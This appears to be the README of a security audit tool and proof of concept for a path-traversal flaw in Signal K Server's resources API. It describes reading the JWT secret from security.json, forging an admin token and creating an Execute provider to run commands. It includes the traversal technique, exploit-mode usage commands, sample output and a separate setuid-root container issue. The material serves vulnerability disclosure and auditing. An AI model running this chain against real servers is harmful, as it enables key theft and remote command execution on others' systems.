# signalk-audit

Signal K Server 资源接口路径遍历的审计工具与 PoC。

`GET /signalk/v2/api/resources/:resourceType/:resourceId` 把 `resourceId` 原样拼进文件路径，四层 `..%2F` 就能从资源目录爬回配置根，读到 `<config>/security.json`。这个文件里有 JWT 签名密钥，拿到就能签一个 admin token，再创建 Execute 类型的 provider，命令以 node 身份在容器里执行。

- 公告：GHSA-4xm8-rg9h-jhq2 / CVE-2026-123807，CVSS 9.8
- 受影响：signalk-server >= 2.0.0（修在 2.34.0），@signalk/resources-provider 1.0.0 - 1.5.2（修在 1.5.3）
- 前提：`allow_readonly=true` 时匿名可打；默认配置下需要任意一个只读账号的 token

## 文件

| 文件 | 作用 |
|---|---|
| `signalk-audit.py` | 审计工具。五种资源类型 × 六层深度枚举，按返回里有没有 `secretKey` 判定 |
| `sk_poc.py` | PoC。读密钥 → 签 admin token → 创建 Execute provider → 执行命令 |
| `sk-history.sh` | 对比官方镜像的构建层，确认 `chmod u+s` 那一层是不是复用的旧层 |

## 用法

```
python3 signalk-audit.py -u http://127.0.0.1:3000
python3 signalk-audit.py -u http://127.0.0.1:3000 --token <只读 JWT>
python3 signalk-audit.py -u http://127.0.0.1:3000 --token <只读 JWT> --exploit --cmd "id"

python3 sk_poc.py                                       # allow_readonly=true 的实例，匿名读密钥
SK_USER=<只读账号> SK_PASS=<口令> python3 sk_poc.py <URL>   # 默认配置，先登录再读
```

`--exploit` 会往下走伪造 token 和创建 provider 两步，默认不启用。`sk_poc.py` 的 traversal 那一步
在默认配置下会被 401 挡住，给一组只读账号（或直接给 `SK_TOKEN`）即可。

输出示例（v2.33.0，带只读账号 token）：

```
[*] 目标 http://127.0.0.1:13000  版本 2.33.0 (HTTP 200)
[*] loginStatus: HTTP 200  authenticationRequired=True  readOnlyAccess=False  userLevel=readonly
[+] notes     深度 4 命中，secretKey 长度 512
[+] routes    深度 4 命中，secretKey 长度 512
[+] waypoints 深度 4 命中，secretKey 长度 512
[+] regions   深度 4 命中，secretKey 长度 512
[+] charts    深度 4 命中，secretKey 长度 512
```

修好的版本（v2.37.0，匿名）：

```
[*] 目标 http://127.0.0.1:13001  版本 2.37.0 (HTTP 200)
[*] loginStatus: HTTP 200  authenticationRequired=True  readOnlyAccess=True  userLevel=None
[ok] 五种资源类型、6 层深度都没逃出目录。版本 2.37.0 大概率已修。
```

退出码：`0` vulnerable，`1` 已修或被鉴权挡住判不了（输出里会写清是哪种），`2` 参数错误。

## 判定口径

看响应里有没有 `secretKey` 字段，不看状态码。

状态码会因为鉴权、路由、provider 是否注册而变：`200` 可能只是一个空对象，`401` 可能只是没带凭证，`404` 可能是这个资源类型压根没有 provider。只看 200 会把 widgets 的 404 误判成安全。

## 边界

默认只发 GET，不写文件、不删文件、不做口令爆破。`--exploit` 需要显式给。

PoC 在容器里跑出来的是 `uid=1000(node)`。镜像里 node 在 docker 组，但没有挂 `/var/run/docker.sock`，拿不到宿主机 root。

## 相关

另一个独立问题：官方镜像把 `/usr/bin/date` 设成了 setuid root，任意插件都能读容器里 root 才能读的文件，`privileged` + `-v /dev:/dev` 的部署下还能读宿主机块设备。公告说 2.37.0 修了，但发布镜像复用了旧的 base 层，`docker history` 能看到 `chmod u+s` 那一层和 2.36.0 是同一个时间戳。`sk-history.sh` 就是查这个的。

## 声明

只用于自己搭的环境和获得授权的测试。作者不对使用本工具造成的任何后果负责。
